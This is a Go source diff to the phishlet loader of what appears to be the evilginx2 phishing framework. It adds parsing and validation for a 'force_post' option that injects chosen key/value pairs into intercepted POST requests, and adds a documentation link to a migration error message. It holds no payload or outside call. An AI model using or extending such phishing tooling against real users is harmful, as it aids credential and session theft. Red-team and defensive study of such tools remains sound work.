@@ -49,6 +49,23 @@ type PostField struct {
 	search *regexp.Regexp
 }
 
+type ForcePostSearch struct {
+	key    *regexp.Regexp `mapstructure:"key"`
+	search *regexp.Regexp `mapstructure:"search"`
+}
+
+type ForcePostForce struct {
+	key   string `mapstructure:"key"`
+	value string `mapstructure:"value"`
+}
+
+type ForcePost struct {
+	path   *regexp.Regexp    `mapstructure:"path"`
+	search []ForcePostSearch `mapstructure:"search"`
+	force  []ForcePostForce  `mapstructure:"force"`
+	tp     string            `mapstructure:"type"`
+}
+
 type Phishlet struct {
 	Site         string
 	Name         string
@@ -65,6 +82,7 @@ type Phishlet struct {
 	landing_path []string
 	cfg          *Config
 	custom       []PostField
+	forcePost    []ForcePost
 }
 
 type ConfigProxyHost struct {
@@ -102,6 +120,23 @@ type ConfigCredentials struct {
 	Custom   *[]ConfigPostField `mapstructure:"custom"`
 }
 
+type ConfigForcePostSearch struct {
+	Key    *string `mapstructure:"key"`
+	Search *string `mapstructure:"search"`
+}
+
+type ConfigForcePostForce struct {
+	Key   *string `mapstructure:"key"`
+	Value *string `mapstructure:"value"`
+}
+
+type ConfigForcePost struct {
+	Path   *string                  `mapstructure:"path"`
+	Search *[]ConfigForcePostSearch `mapstructure:"search"`
+	Force  *[]ConfigForcePostForce  `mapstructure:"force"`
+	Type   *string                  `mapstructure:"type"`
+}
+
 type ConfigPhishlet struct {
 	Name        string             `mapstructure:"name"`
 	ProxyHosts  *[]ConfigProxyHost `mapstructure:"proxy_hosts"`
@@ -109,6 +144,7 @@ type ConfigPhishlet struct {
 	AuthTokens  *[]ConfigAuthToken `mapstructure:"auth_tokens"`
 	AuthUrls    []string           `mapstructure:"auth_urls"`
 	Credentials *ConfigCredentials `mapstructure:"credentials"`
+	ForcePosts  *[]ConfigForcePost `mapstructure:"force_post"`
 	LandingPath *[]string          `mapstructure:"landing_path"`
 }
 
@@ -139,6 +175,7 @@ func (p *Phishlet) Clear() {
 	p.password.key = nil
 	p.password.search = nil
 	p.custom = []PostField{}
+	p.forcePost = []ForcePost{}
 }
 
 func (p *Phishlet) LoadFromFile(path string) error {
@@ -163,7 +200,6 @@ func (p *Phishlet) LoadFromFile(path string) error {
 		return err
 	}
 	if !p.isVersionHigherEqual(&p.Version, "2.2.0") {
-		// TODO: tell user to visit wiki on migration and new documented phishlet format
 		return fmt.Errorf("this phishlet is incompatible with current version of evilginx.\nplease do the following modifications to update it:\n\n" +
 			"- in each `sub_filters` item change `hostname` to `triggers_on`\n" +
 			"- in each `sub_filters` item change `sub` to `orig_sub`\n" +
@@ -173,7 +209,8 @@ func (p *Phishlet) LoadFromFile(path string) error {
 			"- field `key` in both `username` and `password` must be a regexp by default\n" +
 			"- move `username` and `password` into new `credentials` section\n" +
 			"- add `type` field to `username` and `password` with value 'post' or 'json'\n" +
-			"- change `min_ver` to at least `2.2.0`")
+			"- change `min_ver` to at least `2.2.0`\n" +
+			"you can find the phishlet 2.2.0 file format documentation here: https://github.com/kgretzky/evilginx2/wiki/Phishlet-File-Format-(2.2.0)")
 	}
 
 	fp := ConfigPhishlet{}
@@ -318,6 +355,65 @@ func (p *Phishlet) LoadFromFile(path string) error {
 			}
 			o.key_s = *cp.Key
 			p.custom = append(p.custom, o)
+		}
+	}
+
+	if fp.ForcePosts != nil {
+		for _, op := range *fp.ForcePosts {
+			var err error
+			if op.Path == nil || *op.Path == "" {
+				return fmt.Errorf("force_post: missing or empty `path` field")
+			}
+			if op.Type == nil || *op.Type != "post" {
+				return fmt.Errorf("force_post: unknown type - only 'post' is currently supported")
+			}
+			if op.Force == nil || len(*op.Force) == 0 {
+				return fmt.Errorf("force_post: missing or empty `force` field")
+			}
+
+			fpf := ForcePost{}
+			fpf.path, err = regexp.Compile(*op.Path)
+			if err != nil {
+				return err
+			}
+			fpf.tp = *op.Type
+
+			if op.Search != nil {
+				for _, op_s := range *op.Search {
+					if op_s.Key == nil {
+						return fmt.Errorf("force_post: missing search `key` field")
+					}
+					if op_s.Search == nil {
+						return fmt.Errorf("force_post: missing search `search` field")
+					}
+
+					f_s := ForcePostSearch{}
+					f_s.key, err = regexp.Compile(*op_s.Key)
+					if err != nil {
+						return err
+					}
+					f_s.search, err = regexp.Compile(*op_s.Search)
+					if err != nil {
+						return err
+					}
+					fpf.search = append(fpf.search, f_s)
+				}
+			}
+			for _, op_f := range *op.Force {
+				if op_f.Key == nil {
+					return fmt.Errorf("force_post: missing force `key` field")
+				}
+				if op_f.Value == nil {
+					return fmt.Errorf("force_post: missing force `value` field")
+				}
+
+				f_f := ForcePostForce{
+					key:   *op_f.Key,
+					value: *op_f.Value,
+				}
+				fpf.force = append(fpf.force, f_f)
+			}
+			p.forcePost = append(p.forcePost, fpf)
 		}
 	}
 
